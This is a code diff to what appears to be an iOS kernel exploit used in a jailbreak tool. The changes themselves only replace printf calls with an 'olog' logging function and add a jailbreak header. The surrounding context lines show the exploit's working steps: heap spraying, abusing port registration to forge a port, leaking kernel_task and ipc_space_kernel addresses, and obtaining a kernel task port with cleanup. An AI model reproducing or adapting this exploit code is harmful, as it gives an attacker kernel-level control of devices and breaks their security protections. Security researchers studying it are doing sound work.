@@ -12,6 +12,7 @@
 #include <stdint.h>            // uint32_t, uint64_t
 #include <stdio.h>            // fprintf, stderr
 #include <sched.h>
+#include "jailbreak.h"
 
 kern_return_t send_ports(mach_port_t target,
                          mach_port_t payload,
@@ -367,7 +368,7 @@ typedef struct {
 void release_port_ptrs(mach_port_t port){
     char req[sizeof(Request) + 5 * sizeof(mach_msg_ool_ports_descriptor_t) + sizeof(mach_msg_trailer_t)];
     if (mach_msg((mach_msg_header_t*)req, MACH_RCV_MSG, 0, sizeof(req), port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL) != KERN_SUCCESS)
-        printf("[!] Error mach_recv\n");
+        olog("[!] Error mach_recv\n");
 }
 
 mach_port_t kp = 0;
@@ -457,7 +458,7 @@ uint32_t spray_data2(char *data,
 
     kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &err, &conn);
     if (kr != KERN_SUCCESS)
-        return (void)(printf("failed to spawn UC\n")), -1;
+        return (void)(olog("failed to spawn UC\n")), -1;
     return 0;
 }
 
@@ -522,7 +523,7 @@ task_t get_kernel_task(void) {
 
     suspend_all_threads();
 
-    printf("starting exploit\n");
+    olog("starting exploit\n");
 
     char data[16];
     kport_t kport[2] = {};
@@ -547,7 +548,7 @@ task_t get_kernel_task(void) {
     sched_yield();
     kptr = copyinPort(kport,2);
 
-    printf("0x%08x\n",kptr);
+    olog("0x%08x\n",kptr);
     *(uint32_t*)(data) = kptr;
     *(uint32_t*)(data+4) = kptr;
     OUT(prepare_ptr(big_buf, &big_size, kptr, 256));
@@ -575,15 +576,15 @@ again:
 
     mach_port_t arr[2] = {MACH_PORT_NULL,MACH_PORT_NULL};
     r3gister(mach_task_self(),arr,2,3);
-    printf("r3gister done\n");
+    olog("r3gister done\n");
 
     mach_port_t *arrz=0;
     mach_msg_type_number_t sz = 3;
     mach_ports_lookup(mach_task_self(), &arrz, &sz);
-    printf("done %x %x %x %x\n", arrz[0], arrz[1], arrz[2], kp);
+    olog("done %x %x %x %x\n", arrz[0], arrz[1], arrz[2], kp);
     fake_port = arrz[2];
     if (!MACH_PORT_VALID(fake_port)) {
-        printf("Exploit failed, retrying...\n");
+        olog("Exploit failed, retrying...\n");
         goto again;
     }
 
@@ -599,7 +600,7 @@ again:
     sched_yield();
     mach_port_destroy(mach_task_self(), fakeportData);
     OUT(spray_data(tst, sizeof(tst), 10, &fakeportData));
-    printf("done realloc\n");
+    olog("done realloc\n");
 
     OUT(pid_for_task(fake_port, (int*)&kernel_task_addr));
     LOG("kernel_task address: 0x%08lx", kernel_task_addr);
@@ -614,14 +615,14 @@ again:
     sched_yield();
     mach_port_destroy(mach_task_self(), fakeportData);
     OUT(spray_data(tst, sizeof(tst), 10, &fakeportData));
-    printf("done realloc2\n");
+    olog("done realloc2\n");
 
     uintptr_t ipc_space_kernel_addr = 0;
     OUT(pid_for_task(fake_port, (int*)&ipc_space_kernel_addr));
     LOG("ipc_space_kernel address: 0x%08lx", ipc_space_kernel_addr);
 
     if (ipc_space_kernel_addr == kernel_task_addr) {
-        printf("Error: failed to leak pointers\n");
+        olog("Error: failed to leak pointers\n");
         goto out;
     }
 
@@ -634,13 +635,13 @@ again:
 
     OUT(spray_data(tst, sizeof(tst), 10, &postSpray));
     mach_port_destroy(mach_task_self(), postSpray);
-    printf("done postspray\n");
+    olog("done postspray\n");
 
     usleep(10000);
     sched_yield();
     mach_port_destroy(mach_task_self(), fakeportData);
     OUT(spray_data(tst, sizeof(tst), 10, &fakeportData));
-    printf("done realloc3\n");
+    olog("done realloc3\n");
 
     resume_all_threads();
 
@@ -650,12 +651,12 @@ out:
         ret = send_ports(sanity_port, fake_port, 1, 1);
         if(ret == KERN_SUCCESS) {
             fake_port = MACH_PORT_NULL;
-            printf("Exploit failed, retrying...\n");
+            olog("Exploit failed, retrying...\n");
             goto again;
         }
-        printf("send_ports(): %s\n", mach_error_string(ret));
+        olog("send_ports(): %s\n", mach_error_string(ret));
     }
-    printf("Error: exploit failed :(\n");
+    olog("Error: exploit failed :(\n");
     return MACH_PORT_NULL;
 }
 
@@ -676,7 +677,7 @@ void exploit_cleanup(task_t kernel_task) {
     vm_address_t mytaskaddr = 0;
     vm_size_t size = sizeof(mytaskaddr);
     OUT(vm_read_overwrite(kernel_task, portaddr+__builtin_offsetof(kport_t, ip_kobject), size, (vm_address_t)&mytaskaddr, &size));
-    printf("mytaskaddr = 0x%08x\n", mytaskaddr);
+    olog("mytaskaddr = 0x%08x\n", mytaskaddr);
 
     mach_port_t none = 0;
     OUT(r3gister(mach_task_self(), &none, 1, 1));
@@ -694,12 +695,12 @@ void exploit_cleanup(task_t kernel_task) {
     while (1) {
         ret = mach_msg(&reply.Head, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(reply), sanity_port, 0, MACH_PORT_NULL);
         if (ret != KERN_SUCCESS) {
-            printf("cleanup done\n");
+            olog("cleanup done\n");
             break;
         }
         mach_port_t *port = reply.init_port_set[0].address;
 
-        printf("Unregistering port %x...\n", *port);
+        olog("Unregistering port %x...\n", *port);
         mach_port_t arr[3] = { MACH_PORT_NULL, MACH_PORT_NULL, *port };
         OUT(r3gister(mach_task_self(), arr, 3, 3));
         uintptr_t zero = 0;
